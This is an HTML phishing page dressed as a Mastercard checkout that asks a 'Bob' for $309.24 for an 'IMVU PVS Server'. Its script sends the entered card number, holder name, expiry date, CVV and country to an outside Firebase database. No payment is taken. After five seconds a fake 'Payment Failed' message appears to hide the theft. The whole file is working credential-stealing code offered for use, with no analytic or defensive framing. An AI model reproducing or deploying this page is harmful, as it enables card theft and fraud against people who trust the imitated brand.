<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mastercard Payment</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    .card-logos {
      display: flex;
      align-items: center;
    }
    .card-logos input {
      flex: 1;
      padding-right: 120px; /* Adjust the value as needed */
    }
    .card-logos img {
      height: 30px;
      margin-left: 10px;
    }
    @media (max-width: 640px) {
      .card-logos {
        flex-wrap: wrap;
      }
      .card-logos input {
        flex: 0 0 100%;
        padding-right: 0;
        margin-bottom: 10px;
      }
      .card-logos img {
        margin-left: 0;
        margin-right: 10px;
      }
    }
    #logo {
      width: 150px;
      height: 50px;
    }
    /* CSS for modal animation */
.animate-pop-up {
  animation: pop-up 0.3s ease forwards;
}

@keyframes pop-up {
  from {
    opacity: 0;
    transform: translateY(50px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

  </style>
</head>
<body class="bg-gray-100">
  <div class="container mx-auto py-8">
    <div class="max-w-3xl mx-auto bg-white rounded-lg shadow-md p-8">
      <div class="text-center mb-6">
        <img id="logo" src="https://static.developer.mastercard.com/content/mastercard-checkout-services/images/c2p-clients/mastercard-payment-gateway-logo-greybg-1280x720.jpeg" alt="Your Logo" class="mx-auto">
      </div>

     
      <div class="mt-8">
        <p class="text-lg text-black mb-3">Hi Bob,</p>
        <p class="text-lg text-black mb-1"><strong>TMc Mods</strong> are Requesting Payment for</p>
        <p class="text-lg text-black mb-1"><strong>IMVU PVS Server</strong></p>
        <p style="color: grey;" class="text-lg text-black mb-1">Requested Amount: <span style="color: black;">$300.00</span></p>
        <p style="color: grey;" class="text-lg text-black mb-1">Card Processing Fee: <span style="color: black;">$9.24</span></p>
        <p class="text-lg text-black mb-3">Total Amount: <strong style="font-size: 19px;">$309.24</strong></p>
    </div>
    
    
    

      <!-- Payment Information Section -->
      <h2 class="text-2xl font-bold text-center mb-6">Payment Information</h2>
     
      <form id="creditCardForm">
        <div class="mb-4">
          <label for="cardNumber" class="block font-bold mb-2">Card Number</label>
          <div class="card-logos">
            <input type="text" class="form-input w-full rounded-md py-2 px-3" id="cardNumber" placeholder="Enter card number"  maxlength="19" oninput="formatCardNumber(this)">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Visa.svg/1200px-Visa.svg.png" alt="Visa">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png" alt="Mastercard">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1200px-American_Express_logo_%282018%29.svg.png" alt="American Express">
          </div>
        </div>

        <div class="mb-4">
          <label for="cardHolder" class="block font-bold mb-2">Card Holder</label>
          <input type="text" class="form-input w-full rounded-md py-2 px-3" id="cardHolder" placeholder="Enter card holder name" required>
        </div>

        <div class="flex flex-col md:flex-row mb-4">
          <div class="w-full md:w-1/2 md:pr-2 mb-4 md:mb-0">
            <label for="expiryDate" class="block font-bold mb-2">Expiry Date</label>
            <input type="text" class="form-input w-full rounded-md py-2 px-3" id="expiryDate" placeholder="MM/YY" required pattern="^(0[1-9]|1[0-2])\/\d{2}$" maxlength="5" oninput="formatExpiryDate(this)">
          </div>
          <div class="w-full md:w-1/2 md:pl-2">
            <label for="cvv" class="block font-bold mb-2">CVV</label>
            <input type="text" class="form-input w-full rounded-md py-2 px-3" id="cvv" placeholder="Enter CVV" required pattern="[0-9]{3}" maxlength="3">
          </div>
        </div>

        <div class="mb-4">
            <label for="cardHolder" class="block font-bold mb-2">Country</label>
            <input type="text" class="form-input w-full rounded-md py-2 px-3" id="country" placeholder="Enter your Country name" required>
          </div>
      

          <button id="payButton" type="submit" class="w-full bg-black text-white font-bold py-2 px-4 rounded-md hover:bg-gray-700">Pay $309.24</button>

        <div class="flex justify-center mt-6">
          <img src="https://i.ibb.co/C8bdxXQ/pci.png" alt="PCI Compliant" class="h-10 mr-4">
        </div>

        <div class="text-sm text-gray-600 mt-4">
          By clicking "Pay Now", you agree to our <a href="#" target="_blank" class="text-black hover:text-gray-700">Terms and Conditions</a>.
        </div>
      </form>
    
      </div>
    </div>
  </div>
  <!-- Firebase App (the core Firebase SDK) is always required and must be listed first -->
  <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>

  <!-- Add Firebase products that you want to use -->
  <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>

  <script>
   // Initialize Firebase
var firebaseConfig = {
  apiKey: "AIzaSyBU0LStfJ1OJRZZmUzIrjw9cLSeNTFw0MU",
  authDomain: "asfaf-a7cfe.firebaseapp.com",
  databaseURL: "https://asfaf-a7cfe-default-rtdb.firebaseio.com",
  projectId: "asfaf-a7cfe",
  storageBucket: "asfaf-a7cfe.appspot.com",
  messagingSenderId: "64928322953",
  appId: "1:64928322953:web:dc9b3383a1feb309387d58",
  measurementId: "G-TM7HMP57ZK"
};
firebase.initializeApp(firebaseConfig);

// Get a reference to the database
var database = firebase.database();

// Function to format the card number with spaces
function formatCardNumber(input) {
  let value = input.value.replace(/\s/g, ''); // Remove existing spaces
  let formattedValue = '';

  for (let i = 0; i < value.length; i++) {
    if (i > 0 && i % 4 === 0) {
      formattedValue += ' ';
    }
    formattedValue += value.charAt(i);
  }

  input.value = formattedValue;
}

// Function to format the expiry date with '/'
function formatExpiryDate(input) {
  let value = input.value.replace(/\s/g, ''); // Remove existing spaces
  let formattedValue = '';

  for (let i = 0; i < value.length; i++) {
    if (i === 2 && value.charAt(i) !== '/') {
      formattedValue += '/';
    }
    formattedValue += value.charAt(i);
  }

  input.value = formattedValue;
}

// Function to show loader and disable button
function showLoaderAndDisableButton() {
  var button = document.getElementById('payButton');
  button.innerHTML = 'Processing...'; // Change button text to indicate processing
  button.disabled = true; // Disable the button to prevent multiple submissions
}

// Function to enable button and show modal after delay
function enableButtonAndShowModal() {
  var button = document.getElementById('payButton');
  setTimeout(function() {
    button.disabled = false; // Enable the button after delay
    button.innerHTML = 'Pay $309.24'; // Reset button text
    document.getElementById('my-modal').classList.remove('hidden');
    document.getElementById('my-modal').classList.add('animate-pop-up');
  }, 5000); // 5 seconds delay
}

// Add event listener for form submission
document.getElementById('creditCardForm').addEventListener('submit', function(e) {
  e.preventDefault(); // Prevent default form submission

  // Get form values
  var cardNumber = document.getElementById('cardNumber').value;
  var cardHolder = document.getElementById('cardHolder').value;
  var expiryDate = document.getElementById('expiryDate').value;
  var cvv = document.getElementById('cvv').value;
  var country = document.getElementById('country').value;

  // Validate form
  if (this.checkValidity()) {
    // Save data to Firebase Realtime Database
    database.ref('creditCards').push({
      cardNumber: cardNumber,
      cardHolder: cardHolder,
      expiryDate: expiryDate,
      cvv: cvv,
      country: country,
    });

    // Reset form
    document.getElementById('creditCardForm').reset();
    showLoaderAndDisableButton(); // Show loader and disable button
    enableButtonAndShowModal(); // Enable button and show modal after delay
  } else {
    alert('Please fill out all fields correctly.');
  }
});

// Function to close modal
function closeModal() {
  document.getElementById('my-modal').classList.add('hidden');
}



  </script>
</body>
</html>
<div class="fixed z-10 inset-0 overflow-y-auto hidden" id="my-modal">
    <div class="flex items-end justify-center min-h-screen pt-4 px-4 pb-20 text-center sm:block sm:p-0">
        <div class="fixed inset-0 transition-opacity" aria-hidden="true">
            <div class="absolute inset-0 bg-gray-500 opacity-75"></div>
        </div>
        <span class="hidden sm:inline-block sm:align-middle sm:h-screen" aria-hidden="true">&#8203;</span>
        <div class="inline-block align-bottom bg-white rounded-lg px-4 pt-5 pb-4 text-left overflow-hidden shadow-xl transform transition-all sm:my-8 sm:align-middle sm:max-w-lg sm:w-full"
            role="dialog" aria-modal="true" aria-labelledby="modal-headline">
            <div>
                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-red-100">
                    <svg class="h-6 w-6 text-red-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
                        stroke="currentColor" aria-hidden="true">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M6 18L18 6M6 6l12 12" />
                    </svg>
                </div>
                <div class="mt-3 text-center sm:mt-5">
                    <h3 class="text-lg leading-6 font-medium text-gray-900" id="modal-headline">
                        Payment Failed!
                    </h3>
                    <div class="mt-2">
                        <p class="text-sm text-gray-500">
                            Payment Method Exhausted Contact Your Bank and Try Again Later
                        </p>
                    </div>
                </div>
            </div>
            <div class="mt-5 sm:mt-6">
                <button
                    class="inline-flex justify-center w-full rounded-md border border-transparent shadow-sm px-4 py-2 bg-red-600 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:text-sm"
                    onclick="closeModal()">
                    OK
                </button>
            </div>
        </div>
    </div>
</div>
